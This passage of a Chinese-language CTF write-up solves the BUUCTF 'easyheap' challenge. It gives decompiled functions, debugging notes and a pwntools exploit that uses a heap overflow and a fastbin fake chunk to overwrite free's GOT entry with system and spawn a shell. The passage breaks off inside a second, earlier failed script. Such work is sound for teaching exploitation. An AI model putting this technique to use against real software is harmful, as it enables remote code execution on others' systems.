buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      size <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocate Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">read_input</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SuccessFul\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"edit_heap\"><a class=\"anchor\" href=\"#edit_heap\">#</a> edit_heap()</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">edit_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    v2 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">read_input</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No such heap !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"2逻辑分析\"><a class=\"anchor\" href=\"#2逻辑分析\">#</a> 2. 逻辑分析</h1>\n<p>这道题是 <code>堆</code> 的菜单题</p>\n<ul>\n<li><code>main</code>  函数：循环进行选择</li>\n<li><code>delete_heap</code>  函数：选择 <code>Index号</code> （0~9 之间）</li>\n</ul>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJ5o6.png\" alt=\"\" /></p>\n<ul>\n<li><code>133t()</code>  函数，可以得到 flag ，但是需要让 <code>v3=4869</code> ， <code>无符号整型magic&gt;0x1305</code></li>\n<li><code>create_heap()</code> ；</li>\n<li><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJOOA.png\" alt=\"\" /></li>\n</ul>\n<p>创建完堆也要输入内容</p>\n<ul>\n<li><code>edit_heap</code> ,</li>\n</ul>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJvwt.png\" alt=\"\" /></p>\n<h1 id=\"3漏洞分析\"><a class=\"anchor\" href=\"#3漏洞分析\">#</a> 3. 漏洞分析</h1>\n<p>heaparray_add 存放的是某个地址，而 edit 是通过这个地址，来修改这个地址内对应的值</p>\n<p>当我们把 <code>free_got</code>  的地址溢出填入到 <code>heaparray_add[0]</code>  处，通过编辑使 <code>free_got</code>  内部要执行的 <code>free操作</code> 修改为 <code>system</code> ，这使我们后面调用 <code>free</code>  的时候会执行 <code>system</code> , 当一个 <code>chunk</code>  的 <code>data</code>  区域为 <code>/bin/sh</code>  时，释放该 <code>chunk</code>  即可 <code>getshell</code>  (这里为什么 data 的值被当作了 system 的参数有待考究)</p>\n<p>【下面的想法没成功】</p>\n<p>首先想要获取 flag 就需要让 <code>v3=4869</code> ，由于没有限制我们可以直接输入，而还需要满足 magic 条件，magic 初始值未知，发现创建堆块，和后面编辑的堆块大小都没有限制条件，并且后面编辑也没有和申请的大小进行对比，这样我们就可以进行堆溢出操作，我想到是利用 <s>double free</s>  通过申请两个堆块，然后释放一个，利用溢出改变释放的堆块的 fd，修改 fd 指向 magic 地址，然后申请回来进行编辑值，然后就可以得到 flag 了</p>\n<h2 id=\"调试一下\"><a class=\"anchor\" href=\"#调试一下\">#</a> 调试一下</h2>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/26/ZDif5KYH.png\" alt=\"\" /><br />\n发现有个 <code>tcachebins</code>  , 看了题目上说明是 Ubuntu16，一般 glibc 版本为 2.23-2.26，因此要切换版本</p>\n<p>利用命令：</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Desktop/buuctf2/easyheap\n</code></pre>\n<p>切换后就为 fastbin 了（详细的说明在文章 &quot;babyhep_0ctf_2017&quot;）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHYbNV.png\" alt=\"\" /></p>\n<p>查看存储情况：（ <code>x/30gx</code> ）</p>\n<p>申请 0，1，2 大小为 0x10，释放 index 1</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHteud.png\" alt=\"\" /></p>\n<h3 id=\"edit\"><a class=\"anchor\" href=\"#edit\">#</a> edit()</h3>\n<p>选择 index 0，大小为 0x20，输入 eee</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHt1C8.png\" alt=\"\" /></p>\n<p>可以从上面看到，覆盖了以前的 <code>aaa</code></p>\n<p>试试溢出，选择 index 0，大小为 0x20，输入 <code>aaaabbbbccccddddeeeeffffgggg</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHtGvQ.png\" alt=\"\" /></p>\n<p>发现已经被覆盖了（这里不知道是什么原因，输入的值前面总会有个字符 <code>a</code> ）</p>\n<h2 id=\"选择fd指向地址\"><a class=\"anchor\" href=\"#选择fd指向地址\">#</a> 选择 fd 指向地址</h2>\n<p>由于 fd 指向下一个 <code>chunk</code>  的 <code>pre_size</code>  位，这里通常占 0x10 大小（ <code>pre位和size位</code> ），所以我们为了能写入 <code>magic</code>  的位置，所以要让 <code>fd</code>  指向 <code>magic地址</code>  的低地址</p>\n<p>由于不能任意选取地址（因为 malloc 会有检测机制，会在我们申请的时候检测 <code>size</code>  位是否符合，所以我们要构造一个 <code>fake_chunk</code> ）</p>\n<p>先找一个 <code>magic</code>  的低地址，发现有个 0x7f，可以通过适当的偏移来得到一个 <code>0x7f</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHBuQK.png\" alt=\"\" /></p>\n<p>这样就找到了一个满足 <code>fake_chunk</code>  的地址（0x6020ad）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/27/pPHBMLD.png\" alt=\"\" /></p>\n<pre><code>0x6020b0-0x3 = 0x6020ad\n</code></pre>\n<h2 id=\"总结利用方式\"><a class=\"anchor\" href=\"#总结利用方式\">#</a> 总结利用方式</h2>\n<p><s>creat 申请 2 个堆块 0，1；delete 释放 1，利用 edit 溢出到 1，修改 1 的 fd 为 <code>0x6020ad</code> ；收回后该 <code>fake_chunk</code> , 改变 <code>magic</code>  的值，改变最后选择时输入 4869 即可 (没有利用成功)</s></p>\n<p>creat 申请 3 个堆块 0 ,1 , 2 (只用两个行不通，因为申请两个 chunk 的的话，写入 <code>/bin/sh</code>  只能在 chunk0, 而后面会修改  <code>heaparray[0]</code>  的地址为  <code>free_got</code>  的地址，但是 chunk0 访问该地址内容并且可以输入内容，将 <code>free</code>  改为 <code>system</code>  时就会覆盖我们写入的 <code>/bin/sh</code> ，这样无法 getshell ) ，释放堆块 2，利用堆块 1 溢出改变堆块 2 的 fd 的地址为 fake_chunk 地址（溢出时顺便输入字符串 <code>/bin/sh</code> ），此时 fastbin 内： <code>chunk2-&gt;fake_chunk</code> ，再次 creat 两次：先是申请 chunk2，然后申请 <code>fake_chunk</code></p>\n<p>通过溢出 fake_chunk 到 heaparray，修改 heaparray [0] 的内存放的地址为 <code>free_got</code>  ，由于 chunk0 也是根据 <code>heaparray数组</code> 内存放的地址来寻址，修改后就会访问到 <code>free</code>  的内容可以修改成为 <code>system_plt</code> , 这样使用 free 函数时就会执行 <code>system</code> ，这时 <code>free(chunk1)</code>  同等与 <code>system(&quot;/bin/sh&quot;)</code></p>\n<h1 id=\"4exp\"><a class=\"anchor\" href=\"#4exp\">#</a> 4.exp:</h1>\n<p>这里不用 <code>sendline</code>  来换行（因为换行符调了几个小时）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26996</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#system=0x0400700</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./easyheap\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>system_add<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>free_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"free\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">creat</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap : \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#def dump(index):</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Command: \",\"4\")</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Index: \",str(index))</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bbbb\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">##1 </span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"cccc\\n\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#creat(16,\"dddd\\n\") #3</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">88</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6020ad</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#+b\"a\"*33+p64(free_got)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#edit(1,0x60,\"/bin/sh\")</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token string\">b\"aaa\"</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span> <span class=\"token comment\">#fake_chunk</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#edit(4,len(payload2),payload2)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>paylaod3 <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>system_add<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>paylaod3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>paylaod3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#edit(0,len(p64(system_add)),p64(system_add))</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#p.recv()</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/27/pPbZyLD.md.png\" alt=\"\" /></p>\n<pre><code>.\n.\n.\n.\n</code></pre>\n<p>第一开始失败的脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28377</span><span class=\"token 